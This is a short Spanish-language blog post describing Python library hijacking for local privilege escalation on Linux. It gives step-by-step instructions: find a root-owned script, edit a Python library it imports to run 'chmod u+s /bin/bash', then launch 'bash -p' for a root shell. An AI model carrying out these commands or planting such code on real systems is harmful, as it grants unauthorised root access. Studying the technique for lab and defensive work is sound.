---
layout: single
title: Python Library Hijacking - Privilege Escalation
excerpt: "Hoy aprenderemos como escalar privilegios con una libreria de Python"
date: 2022-10-27
classes: wide
header:
  teaser: /assets/images/tratamientoTTY/logo.png
  teaser_home_page: true
categories:
  - Tecnicas
tags:
  - Escalada de Privilegios
  - Hijacking
  - Pyton
---
1) Primero hay que localizar un Script que el dueño sea root

2) Luego al entrar a ese script, veremos que se utiliza alguna librería, y deberemos buscarla en /usr/lib/python... 

3) Entonces, ahora en la librería lo que tenemos que poner es lo siguiente:
``import os``
``os.system("chmod u+s /bin/bash")``

4) Esto lo que hará es que le dará a la bash permisos de superusuario.
ahora solamente deberemos insertar ``bash -p`` y listo.
